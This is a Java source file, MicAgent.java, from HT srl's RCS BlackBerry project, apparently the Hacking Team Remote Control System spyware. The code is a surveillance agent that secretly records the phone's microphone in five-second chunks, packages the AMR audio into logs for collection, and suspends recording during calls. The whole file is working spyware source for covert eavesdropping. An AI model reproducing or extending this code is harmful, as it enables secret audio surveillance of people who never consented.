//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : MicAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import net.rim.device.api.util.DataBuffer;
import blackberry.AppListener;
import blackberry.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.AutoFlashFile;
import blackberry.fs.Path;
import blackberry.interfaces.PhoneCallObserver;
import blackberry.log.Log;
import blackberry.log.LogType;
import blackberry.record.AudioRecorder;
import blackberry.record.AudioRecorderDispatcher;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class MicAgent.
 */
public final class MicAgent extends Agent implements PhoneCallObserver {
    private static final long MIC_PERIOD = 5000;

    //#ifdef DEBUG
    static Debug debug = new Debug("MicAgent", DebugLevel.VERBOSE);
    //#endif

    //#ifdef SAVE_AMR_FILE
    AutoFlashFile amrfile;
    //#endif

    AudioRecorderDispatcher recorder;
    long fId;

    boolean suspended = false;
    Object suspendedLock = new Object();

    /**
     * Instantiates a new mic agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public MicAgent(final boolean agentStatus) {
        super(Agent.AGENT_MIC, agentStatus, Conf.AGENT_MIC_ON_SD, "MicAgent");
        //#ifdef DBC
        Check.asserts(Log.convertTypeLog(agentId) == LogType.MIC,
                "Wrong Conversion");
        //#endif
    }

    /**
     * Instantiates a new mic agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected MicAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualStart() {
        //#ifdef DEBUG_INFO
        debug.info("start");
        //#endif

        AppListener.getInstance().addPhoneCallObserver(this);
        synchronized (suspendedLock) {
            suspended = false;
            startRecorder();
        }
    }

    public void actualStop() {
        //#ifdef DEBUG_INFO
        debug.info("stop");
        //#endif

        AppListener.getInstance().removePhoneCallObserver(this);

        synchronized (suspendedLock) {
            suspended = false;
            stopRecorder(5);
        }
    }

    void startRecorder() {
        //#ifdef DEBUG_TRACE
        debug.trace("startRecorder");
        //#endif

        DateTime dateTime = new DateTime();
        fId = dateTime.getFiledate();

        //#ifdef SAVE_AMR_FILE
        String filename = Path.SD() + "filetest." + dateTime.getOrderedString()
                + ".amr";
        debug.trace("Creating file: " + filename);
        amrfile = new AutoFlashFile(filename, false);
        boolean ret = amrfile.create();
        //ret &= amrfile.write(AudioRecorder.AMR_HEADER);

        Check.asserts(ret, "actualStart: cannot write file: " + filename);
        //#endif

        recorder = AudioRecorderDispatcher.getInstance();
        recorder.start();
    }

    void stopRecorder(final int secs) {
        //#ifdef DEBUG_TRACE
        debug.trace("stopRecorder");
        //#endif

        if (recorder != null) {                      
            Runnable closure = new Runnable() {
                public void run() {
                    try {
                        Thread.sleep(secs * 1000);
                    } catch (InterruptedException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    }
                    try {
                        if (recorder != null) {
                            recorder.stop();
                        }
                    } catch (Exception ex) {

                    }
                }
            };
            
            if(secs == 0){
                recorder.stop();
            }else{
                //#ifdef DEBUG_TRACE
                debug.trace("stopRecorder: waiting "+secs);
                //#endif
                closure.run();
            }
        }
    }

    static final int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5,
            5, 0, 0, 0, 0 };

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        //#ifdef DBC
        Check.requires(recorder != null, "actualRun: recorder == null");
        //#endif

        byte[] chunk = recorder.getAvailable();

        if (chunk != null && chunk.length > 0) {

            //#ifdef DBC
            Check.requires(log != null, "Null log");
            //#endif

            log.createLog(getAdditionalData());
            int offset = 0;
            if (Utils.equals(chunk, 0, AudioRecorder.AMR_HEADER, 0,
                    AudioRecorder.AMR_HEADER.length)) {
                offset = AudioRecorder.AMR_HEADER.length;
            }

            //#ifdef DEBUG_TRACE
            if (offset != 0) {
                debug.trace("offset: " + offset);
            } else {
            }

            //#endif

            log.writeLog(chunk, offset);
            log.close();

            //#ifdef SAVE_AMR_FILE    
            boolean ret = amrfile.append(chunk);
            Check.asserts(ret, "cannot write file!");
            //#endif
        } else {
            //#ifdef DEBUG_WARN
            debug.warn("zero chunk: " + chunk);
            //#endif
        }

    }

    private byte[] getAdditionalData() {
        final int LOG_MIC_VERSION = 2008121901;
        // LOG_AUDIO_CODEC_SPEEX   0x00;
        final int LOG_AUDIO_CODEC_AMR = 0x01;
        final int sampleRate = 8000;

        int tlen = 16;
        final byte[] additionalData = new byte[tlen];

        final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen,
                false);

        databuffer.writeInt(LOG_MIC_VERSION);
        databuffer.writeInt(sampleRate | LOG_AUDIO_CODEC_AMR);
        databuffer.writeLong(fId);

        //#ifdef DBC
        Check.ensures(additionalData.length == tlen,
                "Wrong additional data name");
        //#endif
        return additionalData;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        setPeriod(MIC_PERIOD);
        setDelay(MIC_PERIOD);
        return true;
    }

    public void onCallAnswered(int callId, String phoneNumber) {
    }

    public void onCallConnected(int callId, String phoneNumber) {
        //#ifdef DEBUG_TRACE
        debug.trace("onCallConnected");
        //#endif
        synchronized (suspendedLock) {
            if (!suspended) {
                //#ifdef DEBUG_INFO
                debug.info("Call connected: suspending recording");
                //#endif
                stopRecorder(0);
                suspended = true;
            }
        }
    }

    public void onCallDisconnected(int callId, String phoneNumber) {
        //#ifdef DEBUG_TRACE
        debug.trace("onCallDisconnected");
        //#endif
        synchronized (suspendedLock) {
            if (suspended) {
                //#ifdef DEBUG_INFO
                debug.info("Call disconnected: resuming recording");
                //#endif
                suspended = false;
                startRecorder();
            }
        }
    }

    public void onCallIncoming(int callId, String phoneNumber) {
      //#ifdef DEBUG_TRACE
        debug.trace("onCallIncoming");
        //#endif
        synchronized (suspendedLock) {
            if (!suspended) {
                //#ifdef DEBUG_INFO
                debug.info("Call connected: suspending recording");
                //#endif
                stopRecorder(0);
                suspended = true;
            }
        }
    }

}
